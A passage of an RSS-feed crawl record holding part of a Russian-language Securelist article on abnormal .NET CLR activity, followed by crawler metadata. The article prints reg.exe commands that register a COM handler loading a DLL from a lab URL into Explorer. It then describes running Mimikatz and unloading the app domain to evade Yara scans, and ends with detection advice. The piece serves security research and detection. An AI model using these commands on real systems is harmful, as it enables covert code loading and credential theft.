/v \"CodeBase\" /t REG_SZ /d \"http://ts-dc1.enterprise.lab/ReadOnlyFileIconOverlayHandler.dll\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler\" /ve /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Classes\\ReadOnlyFileIconOverlayHandler.ReadOnlyFileIconOverlayHandler\\CLSID\" /ve /t REG_SZ /d \"{A259C04F-FFA8-310B-864C-FE602840399E}\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\ ReadOnlyFileIconOverlayHandler\" /ve /t REG_SZ /d \"{a259c04f-ffa8-310b-864c-fe602840399e}\" /f\nReg.exe add \"\\\\ts-user1.enterprise.lab\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved\" /v \"{a259c04f-ffa8-310b-864c-fe602840399e}\" /t REG_SZ /d \"ReadOnlyFileIconOverlayHandler\" /f</pre>\n<p> Возвращаемся на хост жертвы (02:30). Эмулируем вход пользователя путем перезагрузки explorer.exe.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204208/Abnormal_CLR_activities_13.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103656\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204208/Abnormal_CLR_activities_13-1024x564.png\" alt=\"\" width=\"1024\" height=\"564\" /></a></p> \n<p>Теперь в explorer.exe загружены сборки .NET, но в процессе все еще нет подозрительных артефактов. Они не появятся, пока мы не загрузим и не запустим <a href=\"https://github.com/gam4er/SneakyRun/tree/master/KatzAssembly\" target=\"_blank\" rel=\"noopener\">KatzAssembly</a>. Обратите внимание на пустой (пока) домен приложения, появившийся в нашем целевом процессе.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205444/Abnormal_CLR_activities_14.png\" class=\"magnificImage\"><img class=\"aligncenter size-full wp-image-103657\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205444/Abnormal_CLR_activities_14.png\" alt=\"\" width=\"400\" /></a></p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205506/Abnormal_CLR_activities_15.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103658\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205506/Abnormal_CLR_activities_15-1024x83.png\" alt=\"\" width=\"1024\" height=\"83\" /></a></p> \n<p>На 3:50 мы выполняем Mimikatz, и в памяти появляются детектируемые сборки.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205531/Abnormal_CLR_activities_16.png\" class=\"magnificImage\"><img class=\"aligncenter size-full wp-image-103659\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205531/Abnormal_CLR_activities_16.png\" alt=\"\" width=\"400\" /></a></p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205553/Abnormal_CLR_activities_17.png\" class=\"magnificImage\"><img class=\"aligncenter size-large wp-image-103660\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205553/Abnormal_CLR_activities_17-1024x290.png\" alt=\"\" width=\"800\" /></a></p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205611/Abnormal_CLR_activities_18.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103661\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205611/Abnormal_CLR_activities_18-1024x61.png\" alt=\"\" width=\"1024\" height=\"61\" /></a></p> \n<p>Сразу после того как Mimikatz выполнит свою работу, мы выгружаем домен приложения (04:18). Сканирование с помощью Yara показывает, что артефактов больше нет.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205646/Abnormal_CLR_activities_19.png\" class=\"magnificImage\"><img class=\"aligncenter size-full wp-image-103662\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205646/Abnormal_CLR_activities_19.png\" alt=\"\" width=\"400\" /></a></p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205703/Abnormal_CLR_activities_20.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103663\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205703/Abnormal_CLR_activities_20-1024x103.png\" alt=\"\" width=\"1024\" height=\"103\" /></a></p> \n<p>Этот практический пример мы отобразили на небольшой инфографике ниже. Подобные атаки, к сожалению, очень просты в исполнении и сложны в обнаружении, поскольку требуются мощности для сканирования памяти и выгружаемых приложений. Однако они довольно редко встречаются в дикой природе.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205805/Abnormal_CLR_activities_ru_21.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103664\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205805/Abnormal_CLR_activities_ru_21-1024x576.png\" alt=\"\" width=\"1024\" height=\"576\" /></a></p> \n<h2 id=\"obnaruzhenie-ochistki-pamyati-clr\">Обнаружение очистки памяти CLR</h2> \n<p>Как выявить поведение, которое могло бы указывать на попытки очистить память CLR? Следует смотреть за тем, как часто выгружаются домены приложений.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205838/Abnormal_CLR_activities_22.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103665\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205838/Abnormal_CLR_activities_22-1024x221.png\" alt=\"\" width=\"1024\" height=\"221\" /></a></p> \n<p>На рисунке изображена последовательность событий ETW: создание домена приложения, загрузка сборки и выгрузка сборки и домена приложения. Записать такой лог можно, например, с помощью <a href=\"https://github.com/fireeye/SilkETW\" target=\"_blank\" rel=\"noopener\">SilkETW</a>.</p>\n<pre class=\"crayon-plain-tag\">SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2008 -ot file -p Loader.json</pre>\n<p> Затем можно агрегировать события загрузки и выгрузки доменов приложений и выявить процесс, который генерирует больше всего таких событий.</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205904/Abnormal_CLR_activities_23.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-103666\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205904/Abnormal_CLR_activities_23.png\" alt=\"\" width=\"610\" height=\"437\" /></a></p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205921/Abnormal_CLR_activities_24.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103667\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205921/Abnormal_CLR_activities_24-1024x138.png\" alt=\"\" width=\"1024\" height=\"138\" /></a></p> \n<p>Хотелось бы, наверное, иметь возможность сканировать память сборки и ее ресурсы при выгрузке, а не только при загрузке, как это сейчас реализовано в интерфейсе AMSI. При этом стоит отметить, что сканирование памяти при завершении работы сборки или домена приложения не может предотвратить запуск нежелательного ПО. Оно лишь позволяет обнаружить сам факт того, что подобный запуск был. Также следует иметь в виду, что любое дополнительное сканирование памяти негативно скажется на производительности.</p> \n<h2 id=\"obnaruzhenie-com-aktivacii-sredy-clr-i-zagruzki-udalennoj-sborki\">Обнаружение COM-активации среды CLR и загрузки удаленной сборки</h2> \n<p>Трюк с загрузкой удаленного кода через активацию COM-сервера в Explorer можно увидеть, если наблюдать за событием 187 и обращать внимание на параметры активации среды (startupMode и COMObjectGUID).</p> \n<p style=\"text-align: center\"><a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20210201/Abnormal_CLR_activities_25.png\" class=\"magnificImage\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-103668\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20210201/Abnormal_CLR_activities_25-1024x53.png\" alt=\"\" width=\"1024\" height=\"53\" /></a></p> \n<p>Также следует наблюдать за созданием в реестре новых COM-серверов, у которых значение <strong>[HKEY_CLASSES_ROOT\\CLSID\\{GUID}\\InprocServer32\\CodeBase]</strong> содержит URL, и загрузкой сборок процессом проводника из <strong>%AppData%\\Local\\assembly\\dl3\\([0-9A-Z]{8}.[0-9A-Z]{3}\\\\){2}.*\\\\Assemb.dll</strong><strong>.</strong></p> \n<h2 id=\"poleznye-ssylki\">Полезные ссылки</h2> \n<ul> \n <li><a href=\"https://github.com/gam4er/SneakyRun\" target=\"_blank\" rel=\"noopener\">https://github.com/gam4er/SneakyRun</a> — код, в том числе скрипты, для манипуляций с обработчиками Explorer.</li> \n <li><a href=\"https://gist.github.com/gam4er/f9d0ed93697f08fc32ddb11fdcec6136\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/gam4er/f9d0ed93697f08fc32ddb11fdcec6136</a> — список всех ресурсов, которые я использовал в этой публикации.</li> \n</ul>","descriptionType":"html","publishedDate":"Tue, 21 Sep 2021 11:00:16 +0000","feedId":36099,"bgimg":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2020/04/28141255/sl_remote_bruteforce_attacks-990x400.jpg","linkMd5":"c6f285a7c89a5cf403cee776896d9144","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn4@2020_5/2021/09/28/11-37-27-808_ef019818d3de8fca.webp","destWidth":990,"destHeight":400,"sourceBytes":79916,"destBytes":56624,"author":"Alexander Rodchenko","articleImgCdnMap":{"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2020/04/28141255/sl_remote_bruteforce_attacks-990x400.jpg":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn4@2020_5/2021/09/28/11-37-27-808_ef019818d3de8fca.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203239/Abnormal_CLR_activities_ru_01.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn12@2020_1/2021/09/28/11-37-47-154_ca0ed0131d2fe2ef.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203334/Abnormal_CLR_activities_02.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn7@2020_6/2021/09/28/11-37-29-212_7363e91d4fbb6897.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203408/Abnormal_CLR_activities_03.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn30@2020_6/2021/09/28/11-37-31-332_7e55f6d18eddb366.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203502/Abnormal_CLR_activities_ru_04.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn27@2020_3/2021/09/28/11-37-29-220_be1a9c330badfc6b.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203558/Abnormal_CLR_activities_05.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn14@2020_1/2021/09/28/11-37-29-098_9327a91831f1b781.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203625/Abnormal_CLR_activities_05-2.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn37@2020_2/2021/09/28/11-37-49-670_ef896b2c29112470.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203700/Abnormal_CLR_activities_06.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn19@2020_1/2021/09/28/11-37-29-392_c6a51f17acad0c1c.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203713/Abnormal_CLR_activities_07.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn54@2020_3/2021/09/28/11-37-31-333_33638c6fc303af3b.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203725/Abnormal_CLR_activities_08.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn49@2020_6/2021/09/28/11-37-49-383_6c8d5afcb95bf5a8.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203938/Abnormal_CLR_activities_09-1024x182.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn17@2020_2/2021/09/28/11-37-29-100_37b829eb004b7be3.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204012/Abnormal_CLR_activities_10-1024x106.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn33@2020_1/2021/09/28/11-37-29-045_7722147b942b6d63.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204133/Abnormal_CLR_activities_11.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn51@2020_5/2021/09/28/11-37-51-512_593b4af1dffbbb8d.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204145/Abnormal_CLR_activities_12.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn9@2020_5/2021/09/28/11-37-29-055_777561d478825405.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204208/Abnormal_CLR_activities_13-1024x564.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn47@2020_5/2021/09/28/11-37-49-675_287ada46f2a94aa7.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205444/Abnormal_CLR_activities_14.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn57@2020_6/2021/09/28/11-37-31-390_2089f33f5605183d.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205506/Abnormal_CLR_activities_15-1024x83.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn25@2020_2/2021/09/28/11-37-47-318_d6dc87e907baf7fc.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205531/Abnormal_CLR_activities_16.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn56@2020_6/2021/09/28/11-37-39-873_95ef348c3cff4a27.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205553/Abnormal_CLR_activities_17-1024x290.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn21@2020_4/2021/09/28/11-37-29-639_f592530a12a60db0.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205611/Abnormal_CLR_activities_18-1024x61.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn41@2020_3/2021/09/28/11-37-29-040_4f1aac1b355490de.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205646/Abnormal_CLR_activities_19.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn15@2020_4/2021/09/28/11-37-29-791_91b74e536ac05590.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205703/Abnormal_CLR_activities_20-1024x103.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn36@2020_2/2021/09/28/11-37-28-949_0db085b6a9b3c72e.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205805/Abnormal_CLR_activities_ru_21-1024x576.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn61@2020_1/2021/09/28/11-37-29-154_dbfd7a5bee31ce9f.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205838/Abnormal_CLR_activities_22-1024x221.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn39@2020_4/2021/09/28/11-37-29-141_b9f3e45fde2b68b4.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205904/Abnormal_CLR_activities_23.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn32@2020_1/2021/09/28/11-37-29-210_e37c771c80ff7fcb.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205921/Abnormal_CLR_activities_24-1024x138.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn45@2020_1/2021/09/28/11-37-29-276_ca3d30459dbbdd43.webp","https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20210201/Abnormal_CLR_activities_25-1024x53.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn24@2020_4/2021/09/28/11-37-45-502_502a6eaabe070513.webp"},"publishedOrCreatedDate":1632829047503}],"record":{"createdTime":"2021-09-28 19:37:27","updatedTime":"2021-09-28 19:37:27","feedId":36099,"fetchDate":"Tue, 28 Sep 2021 11:37:27 +0000","fetchMs":767,"handleMs":288,"totalMs":25798,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"4cf9ab886509ef3fd2ece0a16b714d9c","hostName":"europe-25*","requestId":"00fe9916ad3642398e34a5f56e1e43ae_36099","contentType":"application/rss+xml; charset=UTF-8","totalBytes":592058,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":27,"articlesImgsGithubTotal":27,"successGithubMap":{"myreaderx14":1,"myreaderx15":1,"myreaderx7":1,"myreaderx16":1,"myreaderx6":1,"myreaderx10":1,"myreaderx4":1,"myreaderx32":1,"myreaderx3":1,"myreaderx11":1,"myreaderx33":1,"myreaderx2":1,"myreaderx12":1,"myreaderx1":1,"myreaderx13":1,"myreaderx30":1,"myreaderx31":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx23":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:06:41","updatedTime":"2020-09-07 05:19:56","id":36099,"name":"Securelist","url":"https://securelist.ru/feed/","subscriber":89,"website":null,"icon":"https://securelist.ru/wp-content/themes/securelist/images/site-icon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx61/cdn69@2020_5/2020/09/06/21-19-53-861_bac60eea643d50a7.png","description":"","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":56624,"tmpBodyImgCdnBytes":535434,"tmpBgImgCdnBytes":0,"extra4":{"start":1632829046314,"total":0,"statList":[{"spend":907,"msg":"获取xml内容"},{"spend":288,"msg":"解释文章"},{"spend":1,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":23304,"msg":"正文链接上传到cdn"}]},"extra5":27,"extra6":27,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{"https://kasperskycontenthub.com/securelist-russia/?p=103633_#single_domain":"https://kasperskycontenthub.com/securelist-russia/?p=103633#single_domain","https://kasperskycontenthub.com/securelist-russia/?p=103633_#injection":"https://kasperskycontenthub.com/securelist-russia/?p=103633#injection","https://kasperskycontenthub.com/securelist-russia/?p=103633_#obhod":"https://kasperskycontenthub.com/securelist-russia/?p=103633#obhod"},"extra111_proxyServerAndStatMap":{"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-037.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-038.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-54.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe64.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-008.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-55.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-58.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-036.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe62.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-59.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe67.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-51.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-040.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2020/04/28141255/sl_remote_bruteforce_attacks-990x400.jpg","sourceStatusCode":200,"destWidth":990,"destHeight":400,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn4@2020_5/2021/09/28/11-37-27-808_ef019818d3de8fca.webp","sourceBytes":79916,"destBytes":56624,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1209,"convertSpendMs":21,"createdTime":"2021-09-28 19:37:27","host":"europe-59*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144,c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"78 KB","destSize":"55.3 KB","compressRate":"70.9%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205703/Abnormal_CLR_activities_20-1024x103.png","sourceStatusCode":200,"destWidth":1024,"destHeight":103,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn36@2020_2/2021/09/28/11-37-28-949_0db085b6a9b3c72e.webp","sourceBytes":102955,"destBytes":9746,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":563,"convertSpendMs":24,"createdTime":"2021-09-28 19:37:28","host":"europe-59*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"100.5 KB","destSize":"9.5 KB","compressRate":"9.5%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203938/Abnormal_CLR_activities_09-1024x182.png","sourceStatusCode":200,"destWidth":1024,"destHeight":182,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn17@2020_2/2021/09/28/11-37-29-100_37b829eb004b7be3.webp","sourceBytes":191659,"destBytes":33172,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":449,"convertSpendMs":20,"createdTime":"2021-09-28 19:37:28","host":"us-040*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"187.2 KB","destSize":"32.4 KB","compressRate":"17.3%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204012/Abnormal_CLR_activities_10-1024x106.png","sourceStatusCode":200,"destWidth":1024,"destHeight":106,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn33@2020_1/2021/09/28/11-37-29-045_7722147b942b6d63.webp","sourceBytes":114199,"destBytes":12492,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":592,"convertSpendMs":12,"createdTime":"2021-09-28 19:37:28","host":"europe-58*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"111.5 KB","destSize":"12.2 KB","compressRate":"10.9%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205611/Abnormal_CLR_activities_18-1024x61.png","sourceStatusCode":200,"destWidth":1024,"destHeight":61,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn41@2020_3/2021/09/28/11-37-29-040_4f1aac1b355490de.webp","sourceBytes":66652,"destBytes":6270,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":598,"convertSpendMs":6,"createdTime":"2021-09-28 19:37:28","host":"europe67*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"65.1 KB","destSize":"6.1 KB","compressRate":"9.4%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205838/Abnormal_CLR_activities_22-1024x221.png","sourceStatusCode":200,"destWidth":1024,"destHeight":221,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn39@2020_4/2021/09/28/11-37-29-141_b9f3e45fde2b68b4.webp","sourceBytes":111370,"destBytes":17692,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":480,"convertSpendMs":22,"createdTime":"2021-09-28 19:37:28","host":"us-037*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"108.8 KB","destSize":"17.3 KB","compressRate":"15.9%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203558/Abnormal_CLR_activities_05.png","sourceStatusCode":200,"destWidth":540,"destHeight":67,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn14@2020_1/2021/09/28/11-37-29-098_9327a91831f1b781.webp","sourceBytes":8850,"destBytes":7498,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":488,"convertSpendMs":4,"createdTime":"2021-09-28 19:37:28","host":"us-036*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"8.6 KB","destSize":"7.3 KB","compressRate":"84.7%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205805/Abnormal_CLR_activities_ru_21-1024x576.png","sourceStatusCode":200,"destWidth":1024,"destHeight":576,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn61@2020_1/2021/09/28/11-37-29-154_dbfd7a5bee31ce9f.webp","sourceBytes":127651,"destBytes":37062,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":540,"convertSpendMs":24,"createdTime":"2021-09-28 19:37:28","host":"us-035*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"124.7 KB","destSize":"36.2 KB","compressRate":"29%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203502/Abnormal_CLR_activities_ru_04.png","sourceStatusCode":200,"destWidth":1016,"destHeight":449,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn27@2020_3/2021/09/28/11-37-29-220_be1a9c330badfc6b.webp","sourceBytes":71879,"destBytes":72532,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":565,"convertSpendMs":42,"createdTime":"2021-09-28 19:37:28","host":"us-55*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"70.2 KB","destSize":"70.8 